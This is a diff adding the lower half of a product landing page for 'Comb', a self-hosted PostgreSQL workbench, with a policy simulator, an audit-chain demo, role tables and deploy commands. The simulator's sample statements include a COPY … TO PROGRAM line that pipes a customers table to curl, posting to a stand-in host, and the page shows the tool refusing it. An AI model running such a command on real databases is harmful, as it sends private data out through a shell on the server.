+        <p class="lede">Each audit event stores a SHA-256 hash of its own content plus the previous event's hash. The runtime role can't update or delete rows, and a trigger refuses it anyway. Try rewriting history below. The hashes are computed live in your browser.</p>
+      </div>
+      <div class="chain" id="chain"></div>
+      <div class="chain-bar">
+        <button class="btn" id="tamper" type="button">Rewrite event #3</button>
+        <button class="btn primary" id="verify" type="button">Verify chain</button>
+        <button class="btn" id="reset" type="button">Reset</button>
+        <span class="status ok" id="chain-status">Chain intact · 5 of 5 verified</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- Roles -->
+  <section class="band">
+    <div class="wrap">
+      <div class="head">
+        <span class="eyebrow">Access model</span>
+        <h2>Five roles, four levels, set per connection.</h2>
+        <p class="lede">Workspace roles set the default. Each member can then get <span class="mono">none</span>, <span class="mono">read</span>, <span class="mono">write</span> or <span class="mono">admin</span> on each connection. SSO groups from OIDC or SAML can map to both.</p>
+      </div>
+      <div class="tablewrap">
+        <table>
+          <thead><tr><th>Role</th><th>Default on dev &amp; staging</th><th>Default on prod</th><th>Can also</th></tr></thead>
+          <tbody>
+            <tr><td class="role">Owner</td><td><span class="lvl l-admin">admin</span></td><td><span class="lvl l-admin">admin</span></td><td>Everything, including SSO settings and promoting Admins.</td></tr>
+            <tr><td class="role">Admin</td><td><span class="lvl l-write">write</span></td><td><span class="lvl l-read">read</span></td><td>Manage members, settings, integrations and approvals.</td></tr>
+            <tr><td class="role">Analyst</td><td><span class="lvl l-write">write</span></td><td><span class="lvl l-read">read</span></td><td>Run queries, save to the library, request approvals.</td></tr>
+            <tr><td class="role">Viewer</td><td><span class="lvl l-read">read</span></td><td><span class="lvl l-read">read</span></td><td>Browse and run read-only queries.</td></tr>
+            <tr><td class="role">Service</td><td><span class="lvl l-none">none</span></td><td><span class="lvl l-none">none</span></td><td>API tokens for automation, with explicitly granted access only.</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- Quality charts -->
+  <section class="band alt">
+    <div class="wrap">
+      <div class="head">
+        <span class="eyebrow">Built to be trusted</span>
+        <h2>Tested end to end against a real PostgreSQL.</h2>
+        <p class="lede">Every suite drives the running server over HTTP against a live PostgreSQL 16, covering the paths that matter on production: refusals, approvals, masking and audit.</p>
+      </div>
+      <div class="charts">
+        <div class="card">
+          <h3>End-to-end checks by suite</h3>
+          <div class="bars" id="bars"></div>
+          <span class="cap">574 end-to-end checks in 10 suites, plus 65 unit tests for the parser and the SSRF guard. All passing.</span>
+        </div>
+        <div class="card" style="gap:22px">
+          <div style="display:flex;flex-direction:column;gap:12px">
+            <h3>Codebase</h3>
+            <div class="stack" id="stack"></div>
+            <div class="legend" id="legend"></div>
+            <span class="cap">About 25,000 lines of TypeScript in three packages sharing one set of types.</span>
+          </div>
+          <div class="timeline" style="display:flex;flex-direction:column;gap:12px">
+            <h3>Release history</h3>
+            <svg id="tl" viewBox="0 0 420 120" role="img" aria-label="Releases: 1.3.9 in May, 1.4.0 in early July, 1.4.2 in late July, 1.5.0 in August 2026"></svg>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Deploy -->
+  <section class="band" id="deploy">
+    <div class="wrap">
+      <div class="head">
+        <span class="eyebrow">Deploy</span>
+        <h2>Up in five minutes, on Docker or Kubernetes.</h2>
+        <p class="lede">One image serves the web app and the API on port 8080, runs as a non-root user and exposes a health check. Migrations run automatically at start-up.</p>
+      </div>
+      <div class="deploy">
+        <div style="display:flex;flex-direction:column;gap:12px;min-width:0">
+          <h3>Docker</h3>
+          <div class="codebox"><button class="copy" type="button">copy</button><pre id="code-docker">docker build -t comb:1.5.0 .
+docker run -d --name comb -p 8080:8080 -v comb-data:/data \
+  -e COMB_DATABASE_URL='postgres://comb_app:…@db:5432/comb_meta' \
+  -e COMB_MIGRATION_DATABASE_URL='postgres://comb_owner:…@db:5432/comb_meta' \
+  -e COMB_MASTER_KEY="$(openssl rand -base64 32)" \
+  -e COMB_PUBLIC_URL='https://comb.example.com' \
+  comb:1.5.0</pre></div>
+          <h3>Helm</h3>
+          <div class="codebox"><button class="copy" type="button">copy</button><pre>helm install comb deploy/helm/comb \
+  --set publicUrl=https://comb.example.com \
+  --set trustProxy=10.0.12.34/32</pre></div>
+        </div>
+        <div class="card">
+          <h3>What you need</h3>
+          <dl class="req">
+            <dt>Runtime</dt><dd>Node.js 24, or the provided image</dd>
+            <dt>Metadata</dt><dd>One PostgreSQL database (16 recommended)</dd>
+            <dt>Targets</dt><dd>PostgreSQL 13 to 17</dd>
+            <dt>Backups</dt><dd><span class="mono">pg_dump</span> included, pgBackRest optional</dd>
+            <dt>Identity</dt><dd>Passwords with TOTP, or OIDC and SAML</dd>
+            <dt>Optional</dt><dd>Patroni, SMTP, Slack, Teams, PagerDuty, Datadog</dd>
+          </dl>
+          <p class="cap" style="font-size:14px">Back up the metadata database and <span class="mono">COMB_MASTER_KEY</span> together. One is useless without the other.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="band tight alt">
+  <div class="wrap">
+    <span><b style="color:var(--fg)">Comb 1.5.0</b> · self-hosted PostgreSQL workbench</span>
+    <span>Free to use · no license, seat limit or feature gating</span>
+  </div>
+</footer>
+
+<script>
+(() => {
+const $ = (s) => document.querySelector(s);
+const esc = (s) => s.replace(/[&<>]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' })[c]);
+const KW = /\b(select|from|where|update|set|delete|drop|table|grant|on|to|copy|program|insert|into|values|truncate|order|by|group|limit|and)\b/gi;
+const hl = (s) => esc(s).replace(KW, (m) => `<span class="kw">${m.toUpperCase()}</span>`);
+const reduced = matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+/* ---------- Policy engine (mirrors the server's decision order) ---------- */
+const STMTS = [
+  { id: 'sel', sql: "select id, email, total from customers where country = 'FR' limit 50;", kind: 'read', cmd: 'SELECT', masked: 'email' },
+  { id: 'upd', sql: "update orders set status = 'shipped' where id = 4211;", kind: 'dml', cmd: 'UPDATE' },
+  { id: 'del', sql: 'delete from sessions;', kind: 'dml', cmd: 'DELETE', whereless: true },
+  { id: 'drop', sql: 'drop table events;', kind: 'ddl', cmd: 'DROP TABLE', destructive: 'events' },
+  { id: 'grant', sql: 'grant select on orders to reporting;', kind: 'privilege', cmd: 'GRANT' },
+  { id: 'copy', sql: "copy customers to program 'curl -d @- example.net';", kind: 'blocked', cmd: 'COPY … TO PROGRAM' },
+];
+const CONNS = { dev: { name: 'shop_dev', env: 'dev' }, ro: { name: 'shop_prod', env: 'prod', ro: true }, ap: { name: 'shop_prod', env: 'prod', approvals: true } };
+const STEP_NAMES = ['Parse with the PostgreSQL parser', 'Refuse blocked statements', 'Check your access level', 'Read-only rules', 'Approval gate', 'Typed confirmation', 'Execute, one statement per message', 'Write to the audit trail'];
+const rank = { read: 0, write: 1, admin: 2 };
+
+function decide(st, c, lvl) {
+  // returns { steps: [{state, note}], verdict: {cls, tag, text} }
+  const steps = STEP_NAMES.map(() => ({ state: 'skip', note: '' }));
+  const pass = (i, note = 'ok') => (steps[i] = { state: 'pass', note });
+  const end = (i, state, note, verdict) => { steps[i] = { state, note }; for (let k = i + 1; k < 7; k++) steps[k] = { state: 'skip', note: '—' }; steps[7] = { state: 'pass', note: state === 'go' ? 'recorded' : 'recorded as ' + (state === 'stop' ? 'refused' : 'pending') }; return { steps, verdict }; };
+  pass(0, st.kind === 'blocked' ? 'COPY' : st.kind);
+  if (st.kind === 'blocked') return end(1, 'stop', 'blocked', { cls: 'v-stop', tag: 'Refused', text: 'COPY to a program would run a shell command on the database server. Comb refuses it for everyone, admins included.' });
+  pass(1);
+  const readOnly = c.ro || lvl === 'read';
+  if (st.kind === 'read') {
+    pass(2, lvl);
+    pass(3, readOnly || c.approvals ? 'BEGIN READ ONLY' : 'ok');
+    pass(4, c.approvals ? 'reads pass' : '—'); pass(5, '—');
+    steps[6] = { state: 'go', note: 'ran' }; steps[7] = { state: 'pass', note: 'recorded' };
+    const masked = lvl !== 'admin';
+    return { steps, verdict: { cls: 'v-go', tag: 'Runs', text: masked ? 'Returns 50 rows. The email column is tagged PII in the catalog, so the server masks it before the rows leave Comb. Admin access sees the real values.' : 'Returns 50 rows. Admin access on this connection is exempt from column masking, and the audit trail records who saw what.' } };
+  }
+  if (readOnly) return end(3, 'stop', 'read-only', { cls: 'v-stop', tag: 'Refused', text: c.ro ? `shop_prod is a read-only connection; ${st.cmd} was not run. Nothing reached the database.` : `You have read access to ${c.name}; ${st.cmd} was not run.` });
+  if (st.kind === 'privilege' && lvl !== 'admin') return end(2, 'stop', 'needs admin', { cls: 'v-stop', tag: 'Refused', text: `${st.cmd} needs admin access on ${c.name}. Privilege changes go through Roles & privileges, staged and reviewed as SQL.` });
+  pass(2, lvl);
+  pass(3, 'writable');
+  if (st.whereless) return end(3, 'stop', 'no WHERE', { cls: 'v-stop', tag: 'Blocked', text: 'DELETE without WHERE is blocked by workspace policy. Add a WHERE clause (WHERE true if you really mean every row). An Admin can lift the policy.' });
+  if (c.approvals) return end(4, 'hold', 'approval request', { cls: 'v-hold', tag: 'Needs approval', text: `Becomes an approval request with a row estimate, lock warnings and a dry run that is rolled back. Someone other than you must approve it before it runs on ${c.name}.` });
+  pass(4, '—');
+  if (st.destructive) return end(5, 'hold', `type "${st.destructive}"`, { cls: 'v-hold', tag: 'Confirm', text: `Comb asks you to type “${st.destructive}” before it runs DROP TABLE. Once confirmed, it runs and the audit trail keeps the full statement.` });
+  pass(5, '—');
+  steps[6] = { state: 'go', note: 'ran' }; steps[7] = { state: 'pass', note: 'row images saved' };
+  return { steps, verdict: { cls: 'v-go', tag: 'Runs', text: `1 row updated. The audit event keeps before and after images of the row and a drafted undo statement.` } };
+}
+
+function render(el, res, animate) {
+  const ol = el.steps, v = el.verdict;
+  ol.innerHTML = STEP_NAMES.map((n, i) => `<li><span class="dot"></span><span>${n}</span><span class="r"></span></li>`).join('');
+  const lis = [...ol.children];
+  const paint = (i) => { const s = res.steps[i]; lis[i].className = s.state; lis[i].querySelector('.r').textContent = s.note; };
+  v.className = 'verdict'; v.innerHTML = '<span class="tag">…</span><span>Checking…</span>';
+  const finish = () => { v.className = 'verdict stamp ' + res.verdict.cls; v.innerHTML = `<span class="tag">${res.verdict.tag}</span><span>${res.verdict.text}</span>`; };
+  if (!animate || reduced) { lis.forEach((_, i) => paint(i)); finish(); return Promise.resolve(); }
+  return new Promise((done) => { let i = 0; const t = setInterval(() => { paint(i++); if (i === lis.length) { clearInterval(t); finish(); done(); } }, 170); el.timers.push(t); });
+}
+
+/* Simulator */
+const sim = { steps: $('#s-steps'), verdict: $('#s-verdict'), timers: [] };
+$('#s-stmt').innerHTML = STMTS.map((s, i) => `<input type="radio" name="stmt" id="st-${s.id}" value="${s.id}" ${i === 1 ? 'checked' : ''}><label for="st-${s.id}">${esc(s.sql)}</label>`).join('');
+function runSim() {
+  sim.timers.forEach(clearInterval); sim.timers = [];
+  const c = CONNS[document.querySelector('input[name=conn]:checked').value];
+  const lvl = document.querySelector('input[name=lvl]:checked').value;
+  const st = STMTS.find((s) => s.id === document.querySelector('input[name=stmt]:checked').value);
+  $('#s-conname').textContent = c.name + (c.ro ? ' · read-only' : c.approvals ? ' · approvals required' : '');
+  const env = $('#s-env'); env.textContent = c.env.toUpperCase(); env.className = 'env ' + (c.env === 'prod' ? 'env-prod' : 'env-dev');
+  $('#s-who').textContent = lvl + ' access';
+  $('#s-sql').innerHTML = hl(st.sql);
+  render(sim, decide(st, c, lvl), true);
+}
+document.querySelectorAll('#policy input').forEach((i) => i.addEventListener('change', runSim));
+runSim();
+
+/* Hero: an auto-playing reel */
+const hero = { steps: $('#h-steps'), verdict: $('#h-verdict'), timers: [] };
+const REEL = [
+  { st: 'sel', c: 'ap', lvl: 'write', who: 'analyst · write' },
+  { st: 'del', c: 'dev', lvl: 'write', who: 'developer · write' },
+  { st: 'upd', c: 'ap', lvl: 'write', who: 'analyst · write' },
+  { st: 'copy', c: 'dev', lvl: 'admin', who: 'admin · admin' },
+  { st: 'drop', c: 'dev', lvl: 'write', who: 'developer · write' },
+];
+let reelAt = 0;
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+async function typeSql(sql) {
+  const el = $('#h-sql');
+  if (reduced) { el.innerHTML = hl(sql); return; }
+  for (let i = 1; i <= sql.length; i += 2) { el.innerHTML = hl(sql.slice(0, i)) + '<span class="caret"></span>'; await sleep(22); }
+  el.innerHTML = hl(sql);
+}
+async function reel() {
+  for (;;) {
+    const r = REEL[reelAt++ % REEL.length];
+    const c = CONNS[r.c], st = STMTS.find((s) => s.id === r.st);
+    $('#h-conn').textContent = c.name; const env = $('#h-env'); env.textContent = c.env.toUpperCase(); env.className = 'env ' + (c.env === 'prod' ? 'env-prod' : 'env-dev');
+    $('#h-who').textContent = r.who;
+    hero.steps.innerHTML = STEP_NAMES.map((n) => `<li><span class="dot"></span><span>${n}</span><span class="r"></span></li>`).join('');
+    hero.verdict.className = 'verdict'; hero.verdict.innerHTML = '<span class="tag">…</span><span>Typing…</span>';
+    await typeSql(st.sql);
+    await sleep(300);
+    await render(hero, decide(st, c, r.lvl), true);
+    if (reduced) return;
+    await sleep(3600);
+  }
+}
+// Show a finished first frame immediately, then start the reel.
+(() => { const r = REEL[0]; const c = CONNS[r.c], st = STMTS.find((s) => s.id === r.st); $('#h-sql').innerHTML = hl(st.sql); render(hero, decide(st, c, r.lvl), false); })();
+if (!reduced) setTimeout(() => { reelAt = 1; reel(); }, 4000);
+
+/* ---------- Screens ---------- */
+const SHOTS = [
+  { id: 'query', tab: 'Query', img: 'img/query.jpg', title: 'SQL editor', text: 'PostgreSQL highlighting and autocomplete from the live catalog. Results stream into a virtual grid.', list: ['⌘↵ runs the statement under the cursor, ⌘⇧↵ runs everything', 'Cancel, error positions, notices, CSV export', 'History and the team query library in the sidebar'] },
+  { id: 'table', tab: 'Data grid', img: 'img/table.jpg', title: 'Table grid', text: 'Server-side paging on the primary key, so large tables open instantly.', list: ['Sort and filter on the server, with row-count estimates', 'Edits staged, reviewed as SQL, applied in one transaction', 'Structure, constraints, indexes, triggers and DDL tabs'] },
+  { id: 'erd', tab: 'ERD', img: 'img/erd.jpg', title: 'Entity-relationship diagram', text: 'Automatic layout of a whole schema, including relationships inferred where no foreign key exists.', list: ['Click a table to open it', 'Handles schemas with hundreds of tables', 'Keys and nullability at a glance'] },
+  { id: 'monitor', tab: 'Monitoring', img: 'img/monitor.jpg', title: 'Live monitoring', text: 'Connections, transactions, cache hit and the slowest statements from pg_stat_statements.', list: ['Blocking tree with a confirmed terminate', 'Table health and alert rules', 'Literal values hidden from non-admins'] },
+  { id: 'catalog', tab: 'Data catalog', img: 'img/catalog.jpg', title: 'Data catalog and masking', text: 'Describe, own, tag and classify every column. A PII scan suggests what to protect.', list: ['Classes: internal, financial, PII, secret', 'Masks applied on the server to every result and export', 'Masked columns cannot be filtered or sorted to probe values'] },
+  { id: 'topology', tab: 'Topology', img: 'img/topology.jpg', title: 'Cluster topology', text: 'Primary, replicas, replication slots and lag. With Patroni: members, switchover and failover history.', list: ['Spots inactive slots that hold back WAL', 'Switchover from the UI with Patroni', 'Credentials re-entered when an address changes'] },
+];
+const tabs = $('#tabs');
+tabs.innerHTML = SHOTS.map((s, i) => `<button class="tab" role="tab" id="tab-${s.id}" aria-selected="${i === 0}" type="button">${s.tab}</button>`).join('');
+let shotTimer = null, shotAt = 0;
+function showShot(i, user) {
+  shotAt = i; const s = SHOTS[i];
+  [...tabs.children].forEach((b, k) => b.setAttribute('aria-selected', String(k === i)));
+  const img = $('#shot-img'); img.src = s.img; img.alt = s.title + ' screen in Comb'; img.style.animation = 'none'; void img.offsetWidth; img.style.animation = '';
+  $('#shot-title').textContent = s.title; $('#shot-text').textContent = s.text; $('#shot-list').innerHTML = s.list.map((l) => `<li>${esc(l)}</li>`).join('');
+  if (user && shotTimer) { clearInterval(shotTimer); shotTimer = null; }
+}
+[...tabs.children].forEach((b, i) => b.addEventListener('click', () => showShot(i, true)));
+showShot(0);
+if (!reduced) shotTimer = setInterval(() => showShot((shotAt + 1) % SHOTS.length), 6500);
+
+/* ---------- Module map ---------- */
+const GROUPS = [
+  ['Workbench', [['Connections', 'SSL, SSH tunnels, environments'], ['Query editor', 'autocomplete, explain'], ['Data grid', 'staged edits'], ['ERD', 'auto layout'], ['Command palette', '⌘K everything']]],
+  ['Database', [['Monitoring', 'KPIs, locks, alerts'], ['Approvals', 'four-eyes writes'], ['Migrations', 'up/down, drift'], ['Scheduled jobs', 'cron SQL'], ['Query library', 'versioned, shared'], ['Data catalog', 'PII, masking'], ['Data quality', 'tests, alerts'], ['Backups', 'verify, restore'], ['Topology', 'replicas, Patroni']]],
+  ['Governance', [['Audit trail', 'hash-chained'], ['Compliance', 'controls, DSR'], ['Usage & cost', 'chargeback']]],
+  ['Access', [['Roles & privileges', 'staged GRANTs'], ['Team & access', 'SSO groups'], ['Security', 'MFA, tokens, IPs']]],
+  ['Platform', [['Integrations', 'Slack, Teams, webhooks'], ['Deployment', 'health, flags']]],
+];
+let mi = 0;
+$('#map').innerHTML = GROUPS.map(([g, mods]) => `<div class="group"><h3>${g}<span>${mods.length}</span></h3>${mods.map(([m, d]) => `<div class="mod" style="--i:${mi++}">${m}<small>${esc(d)}</small></div>`).join('')}</div>`).join('');
+
+/* ---------- Charts ---------- */
+const SUITES = [['identity', 116], ['workflow', 93], ['table', 70], ['data', 68], ['ops', 62], ['gov', 48], ['platform', 45], ['query', 34], ['core', 26], ['ssh', 12]];
+const max = 120;
+$('#bars').innerHTML = SUITES.map(([n, v], i) => `<div class="bar"><span class="nm">${n}</span><span class="tr"><span class="fl" style="display:block;width:${(v / max) * 100}%;--i:${i}"></span></span><span class="v">${v}</span></div>`).join('');
+const CODE = [['server', 12918, 'var(--accent)'], ['web', 11435, 'var(--info)'], ['shared', 967, 'var(--warn)']];
+const tot = CODE.reduce((a, c) => a + c[1], 0);
+$('#stack').innerHTML = CODE.map(([n, v, c]) => `<div style="flex:${v};background:${c}" title="${n}: ${v.toLocaleString('en')} lines"></div>`).join('');
+$('#legend').innerHTML = CODE.map(([n, v, c]) => `<span><i style="background:${c}"></i>${n} <span class="mono tnum">${(v / 1000).toFixed(1)}k</span> · ${Math.round((v / tot) * 100)}%</span>`).join('');
+
+// Timeline on a real date scale: 1 May to 31 Aug 2026
+const t0 = Date.UTC(2026, 4, 1), t1 = Date.UTC(2026, 8, 1), X = (d) => 20 + ((d - t0) / (t1 - t0)) * 380;
+const RELS = [['1.3.9', Date.UTC(2026, 4, 19), 'Audit chain'], ['1.4.0', Date.UTC(2026, 6, 2), 'Approvals, jobs'], ['1.4.2', Date.UTC(2026, 6, 28), 'ERD fix'], ['1.5.0', Date.UTC(2026, 7, 12), 'Masking']];
+let svg = `<line x1="20" y1="70" x2="400" y2="70" stroke="var(--line)" stroke-width="2"/>`;
+['May', 'Jun', 'Jul', 'Aug'].forEach((m, i) => { const x = X(Date.UTC(2026, 4 + i, 1)); svg += `<line x1="${x}" y1="66" x2="${x}" y2="74" stroke="var(--line)" stroke-width="2"/><text x="${x + 4}" y="92">${m}</text>`; });
+RELS.forEach(([v, d, note], i) => {
+  const x = X(d), up = i % 2 === 0, y = up ? 34 : 112;
+  svg += `<line x1="${x}" y1="70" x2="${x}" y2="${up ? 44 : 100}" stroke="var(--accent)" stroke-width="1.5"/><circle cx="${x}" cy="70" r="6" fill="var(--accent)" stroke="var(--panel)" stroke-width="2"/>`;
+  svg += `<text class="ttl" x="${Math.min(x - 6, 330)}" y="${up ? 22 : 112}">${v}</text><text x="${Math.min(x - 6, 330)}" y="${up ? 38 : 126}" style="font-size:10.5px">${note}</text>`;
+});
+$('#tl').setAttribute('viewBox', '0 0 420 140');
+$('#tl').innerHTML = svg;
+
+/* ---------- Audit chain (real SHA-256) ---------- */
+const EVENTS = ['owner signed in', 'SELECT on customers · 50 rows', 'UPDATE orders · 1 row', 'approval #18 approved', 'DROP TABLE tmp_import'];
+let events = [...EVENTS], stored = [];
+async function sha(s) {
+  try { const b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s)); return [...new Uint8Array(b)].map((x) => x.toString(16).padStart(2, '0')).join(''); }
+  catch { let h = 2166136261; for (const ch of s) { h ^= ch.charCodeAt(0); h = Math.imul(h, 16777619) >>> 0; } return h.toString(16).padStart(8, '0').repeat(8); }
+}
+async function chainOf(list) { const out = []; let prev = '0'.repeat(64); for (let i = 0; i < list.length; i++) { const h = await sha(prev + '|' + (i + 1) + '|' + list[i]); out.push({ prev, h }); prev = h; } return out; }
+async function drawChain(badFrom = -1) {
+  // badFrom: index of the first event whose recomputed hash fails; it and every later link are broken.
+  const c = $('#chain'); c.innerHTML = '';
+  events.forEach((ev, i) => {
+    if (i) { const l = document.createElement('div'); l.className = 'link' + (badFrom >= 0 && i > badFrom ? ' broken' : ''); c.appendChild(l); }
+    const b = document.createElement('div');
+    b.className = 'blk' + (ev !== EVENTS[i] ? ' edited' : '') + (badFrom >= 0 && i >= badFrom ? ' bad' : '');
+    b.innerHTML = `<div class="no"><span>#${i + 1}</span><span>${['09:02', '09:14', '09:21', '09:40', '10:05'][i]}</span></div><div class="ev">${esc(ev)}</div><div class="h">prev <b>${stored[i].prev.slice(0, 10)}…</b></div><div class="h">hash <b>${stored[i].h.slice(0, 10)}…</b></div>`;
+    c.appendChild(b);
+  });
+}
+async function reset() { events = [...EVENTS]; stored = await chainOf(events); await drawChain(); const s = $('#chain-status'); s.className = 'status ok'; s.textContent = 'Chain intact · 5 of 5 verified'; }
+$('#tamper').addEventListener('click', async () => { events[2] = 'UPDATE orders · 0 rows'; await drawChain(); const s = $('#chain-status'); s.className = 'status'; s.textContent = 'Event #3 rewritten. Its stored hash was not updated. Press Verify.'; });
+$('#verify').addEventListener('click', async () => {
+  let prev = '0'.repeat(64), bad = -1;
+  for (let i = 0; i < events.length; i++) { const h = await sha(prev + '|' + (i + 1) + '|' + events[i]); if (h !== stored[i].h && bad < 0) bad = i; prev = stored[i].h; }
+  const s = $('#chain-status');
+  if (bad < 0) { s.className = 'status ok'; s.textContent = 'Chain intact · 5 of 5 verified'; await drawChain(); }
+  else { s.className = 'status bad'; s.textContent = `Chain broken at event #${bad + 1}. Recomputed hash does not match.`; await drawChain(bad); }
+});
+$('#reset').addEventListener('click', reset);
+reset();
+
+/* ---------- Copy buttons ---------- */
+document.querySelectorAll('.codebox .copy').forEach((b) => b.addEventListener('click', async () => {
+  const pre = b.nextElementSibling;
+  try { await navigator.clipboard.writeText(pre.textContent); b.textContent = 'copied'; }
+  catch { const r = document.createRange(); r.selectNodeContents(pre); const sel = getSelection(); sel.removeAllRanges(); sel.addRange(r); b.textContent = 'selected'; }
+  setTimeout(() => (b.textContent = 'copy'), 1600);
+}));
+
+/* ---------- Replay-on-view animations (everything is already visible at rest) ---------- */
+if (!reduced && 'IntersectionObserver' in window) {
+  const io = new IntersectionObserver((entries) => entries.forEach((e) => {
+    if (!e.isIntersecting) return;
+    const el = e.target; io.unobserve(el);
+    if (el.id === 'stats') el.querySelectorAll('[data-count]').forEach((n) => {
+      const end = +n.dataset.count, pre = n.dataset.prefix || '', t0 = performance.now();
+      const step = (t) => { const p = Math.min(1, (t - t0) / 1100), v = Math.round(end * (1 - Math.pow(1 - p, 3))); n.textContent = pre + v; if (p < 1) requestAnimationFrame(step); };
+      requestAnimationFrame(step);
+    });
+    else el.classList.add('play');
+  }), { threshold: 0.35 });
+  ['#stats', '#map', '#bars', '#stack'].forEach((s) => io.observe($(s)));
+}
+})();
+</script>
+
+</body>
+</html>
